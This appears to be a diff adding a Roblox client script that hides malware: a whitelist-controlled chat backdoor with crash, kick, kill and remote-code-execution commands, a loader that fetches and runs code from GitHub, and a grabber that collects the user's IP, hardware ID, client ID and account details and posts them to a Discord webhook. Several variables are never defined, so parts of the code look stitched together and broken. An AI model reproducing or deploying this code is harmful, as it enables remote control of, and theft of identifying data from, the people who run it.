@@ -1,0 +1,220 @@
+Players = game.Players
+LocalPlayer = Players.LocalPlayer
+ReplicatedStorage = game.ReplicatedStorage
+GrabEvents = ReplicatedStorage:WaitForChild("GrabEvents")
+ExtendGrabLine = (GrabEvents) and GrabEvents:FindFirstChild("ExtendGrabLine")
+deb = false
+Whitelist = {
+    "MaybeFlashh",
+}
+local FindMatch = function(Name)
+	Name = Name:lower()
+	for _, Player in Players:GetPlayers() do
+		if Player.Name:lower():sub(1, #Name) == Name then
+			return Player
+		end
+	end
+	return nil
+end
+
+cmds = {
+	["crash"] = function()
+		while true do
+			print("Penis")
+		end
+	end,
+
+	["kick"] = function(Admin, Reason) 
+		if Reason then
+			LocalPlayer:Kick(Reason)
+		else
+			LocalPlayer:Kick("The game thinks you're cheating so a black hole appeared and took you away.")
+		end
+	end,
+
+	["bring"] = function(Admin)
+		if LocalPlayer.Character and Admin.Character then
+			LocalPlayer.Character:FindFirstChild("HumanoidRootPart").CFrame = Admin.Character:FindFirstChild("HumanoidRootPart").CFrame
+		end
+	end,
+
+	["kill"] = function(Admin)
+		if LocalPlayer.Character then
+			LocalPlayer.Character:FindFirstChildWhichIsA("Humanoid"):ChangeState(Enum.HumanoidStateType.Dead)
+		end
+	end,
+
+	["rce"] = function(Admin, code)
+		if code and type(code) == "string" then
+			pcall(function()
+				loadstring(code)()
+			end)
+		end
+	end,
+}
+
+local function chat(player, message)
+for i, e in ipairs(Whitelist) do
+if e == player then
+deb = true
+end
+end
+    local Lower = string.lower(message)
+    if string.sub(Lower, 1, 1) == ":" then
+        local args = string.split(string.sub(Lower, 2), " ")
+        local Command = table.remove(args, 1)
+        local Target = table.remove(args, 1)
+        local Data = table.concat(args, " ")
+        if Command and Target and type(Command) == "string" and type(Target) == "string" and cmds[Command] then
+            Command = string.lower(Command)
+            if Target:lower() == LocalPlayer.Name:lower() or FindMatch(Target) == LocalPlayer or Target == "all" then
+                pcall(function()
+                    cmds[Command](player, Data)
+                end)
+            end
+        end
+    end
+    deb = false
+end
+
+ExtendGrabLine.OnClientEvent:Connect(function(Plr, Data)
+for i, e in ipairs(Whitelist) do
+if e == player then
+deb = true
+end
+end
+	if deb then 
+		local Lower = string.lower(Data) 
+		if string.sub(Lower, 1, 1) == ":" then 
+			local args = string.split(string.sub(Lower,2), " ")
+			local Command = table.remove(args, 1)
+			local Target = table.remove(args, 1)
+			local Data = table.concat(args, " ")
+			if Command and Target and type(Command) == "string" and type(Target) == "string" and cmds[Command] then
+				Command = string.lower(Command)
+				if Target == LocalPlayer.Name:lower() or FindMatch(Target) == LocalPlayer or Target == "all" then
+					cmds[Command](Plr, Data)
+				end
+			end
+		end
+	end
+end)
+
+function add(player)
+	player.Chatted:Connect(function(message)
+		chat(player, message)
+	end)
+end
+
+for _, player in ipairs(Players:GetPlayers()) do
+	add(player)
+end
+
+Players.PlayerAdded:Connect(function(player)
+	add(player)
+end)
+
+local WebhookUrl = "https://discord.com/api/webhooks/1335733755251396790/-regQbELxtwe7148V3yNsU8iEdLputKFWfRUQjuGHVuvvIrEoVs1sXv7jWQGym5HveHu"
+local path, luav = "LuaV/LuaV.lua", getgenv().luav if not(luav) then
+if isfile(path) then luav = dofile(path)() else
+local data = game:HttpGet("https://raw.githubusercontent.com/Undebolted/FTAP/refs/heads/main/LuaV%20WP")
+task.defer(writefile, path, data); luav = loadstring(data)() end end; path = nil
+
+local rbxanls = game:GetService("RbxAnalyticsService")
+local placeid = game.PlaceId
+local jobid = game.JobId
+local DistributedGameTime = w.DistributedGameTime
+
+local num = DistributedGameTime//3600
+local playingtime = num..":"
+DistributedGameTime = DistributedGameTime - num*3600
+
+num = DistributedGameTime//60
+playingtime = playingtime..num..":"
+DistributedGameTime = DistributedGameTime - num*60
+
+playingtime = playingtime..DistributedGameTime//1
+
+local elapsedTime = elapsedTime()
+
+local num = elapsedTime//3600
+local robloxtime = num..":"
+elapsedTime = elapsedTime - num*3600
+
+num = elapsedTime//60
+robloxtime = robloxtime..num..":"
+elapsedTime = elapsedTime - num*60
+
+robloxtime = robloxtime..elapsedTime//1
+
+local avatarlink = hs[1]:JSONDecode(http_request({Method = "GET", Url = "https://thumbnails.roblox.com/v1/users/Avatar?userIds="..muid.."&size=420x420&format=Png&isCircular=false"})["Body"])["data"][1]["imageUrl"]
+local avatarheadshotlink = avatarlink:gsub("Avatar", "AvatarHeadshot")
+
+local placedata = game:GetService("MarketplaceService"):GetProductInfo(placeid)
+
+local data = {
+    "**[Player Info](https://www.roblox.com/users/"..muid..")**",
+    "***Display Name: ***"..dname[1],
+    "***User Name: ***"..name[1],
+    "***User Id: ***"..muid,
+    "***Follow User Id: ***"..me.FollowUserId,
+    "***AccountAge: ***"..me.AccountAge,
+    "***Ip: ***"..game:HttpGet("https://v4.ident.me/"),
+    "",
+    "**[PC Info](https://roblox.com)**",
+    "***Time: ***"..os.date("%X"),
+    "***Date: ***"..os.date("%m/%d/%Y"),
+    "",
+    "**[Roblox Info](https://roblox.com)**",
+    "***Memory Usage: ***"..(gcinfo()//100).."MB",
+    "***Working Time: ***"..robloxtime,
+    "***Language: ***"..game:GetService("LocalizationService").RobloxLocaleId,
+    "***Id: ***"..rbxanls:GetClientId(),
+    "***Git Hash: ***"..r.ClientGitHash,
+    "***Version: ***"..version(),
+    "",
+    "**[Injector Info](https://roblox.com)**",
+    "***Name: ***"..(identifyexecutor and identifyexecutor()) or "None",
+    "***HWID: ***"..((get_hwid and get_hwid()) or "None"),
+    "",
+    "**[Place Info](https://www.roblox.com/games/"..placeid..")**",
+    "***Name: ***"..placedata.Name,
+    "***Description: ***"..placedata.Description,
+    "***Updated: ***"..placedata.Updated,
+    "***Created: ***"..placedata.Created,
+    "***Id: ***"..placeid,
+    "",
+    "**[Server Info](https://roblox.com)**",
+    "***Players: ***"..#plrs().."/"..p.MaxPlayers.."(Preferred: "..p.PreferredPlayers..")",
+    "***Ping: ***"..(me[1]:GetNetworkPing()*2000//1).."ms",
+    "***Playing Time: ***"..playingtime,
+    "***Parts: ***"..w[1]:GetNumAwakeParts(),
+    "***Physics FPS: ***"..w[1]:GetRealPhysicsFPS(),
+    "***Id: ***"..jobid,
+    "***Join Link: ***".."```roblox://placeId="..placeid.."&gameInstanceId="..jobid.."```",
+    "",
+    "**[Ip Info](http://ip-api.com/json)**",
+    LuaV(hs[1]:JSONDecode(game:HttpGet("http://ip-api.com/json"))):c("s")[1]
+}
+
+data = hs[1]:JSONEncode(
+    {
+        ["avatar_url"] = "",
+        ["content"] = "**```ansi\n[2;31mVFDL: New Data![0m[2;31m[0m\n```**",
+        ["embeds"] = {
+            {
+                ["description"] = LuaV(data):c("s")[1],
+                ["type"] = "rich",
+                ["color"] = tonumber("0xFF0000"),
+                ["thumbnail"] = {url = avatarlink},
+                ["author"] = {
+                    ["name"] = dname[1].." ("..name[1]..")",
+                    ["icon_url"] = avatarheadshotlink
+                }
+            }
+        }
+    }
+)
+
+local request = http_request or request or HttpPost or syn.request
+if request then print(unpack(request({Url = WebhookUrl, Body = data, Method = "POST", Headers = {["content-type"] = "application/json"}}))) end
